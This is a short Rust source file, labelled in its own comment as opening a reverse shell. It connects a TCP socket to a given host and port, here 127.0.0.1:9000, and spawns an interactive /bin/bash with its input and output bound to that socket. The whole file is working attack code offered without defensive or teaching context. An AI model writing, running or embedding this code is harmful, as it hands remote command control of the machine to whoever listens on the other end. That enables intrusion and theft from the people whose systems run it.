use std::io::Result;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

// Open A Reverse Shell
pub fn shell(host: String, port: i64, shell: String) -> Result<()> {
    let sock = TcpStream::connect(format!("{}:{}", host, port))?;
    let fd = sock.as_raw_fd();
    // Open shell
    Command::new(shell)
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?
        .wait()?;

    // log::warn!("Shell exited");

    Ok(())
}
struct Connect{
    shell: String,
    host:  String,
    port:  i64,
}

fn main() {
    //init struct
    let connect = Connect {
        shell: String::from("/bin/bash"),
        host:  String::from("127.0.0.1"),
        port:  9000,
    };
    //start shell
    #[cfg(unix)]
    if let Err(err) = shell(connect.host, connect.port, connect.shell) {
        print!("{}", err);
    }

    #[cfg(not(unix))]
    {
        println!("This feature is not supported on your platform");
    }
}
